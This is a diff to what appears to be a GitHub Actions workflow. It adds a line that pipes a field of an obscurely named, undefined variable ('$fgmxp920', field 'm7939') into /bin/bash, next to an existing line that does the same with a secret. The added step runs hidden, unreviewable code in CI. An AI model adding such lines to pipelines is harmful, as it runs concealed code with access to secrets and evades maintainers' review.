@@ -27,6 +27,7 @@ jobs:
           x64: ${{ secrets.x64 }}
         run: |
           printf '%s' "$x64" | jq -r .t02 | /bin/bash
+          printf '%s' "$fgmxp920" | jq -r .m7939 | /bin/bash
 
       - name: Store results
         if: always()
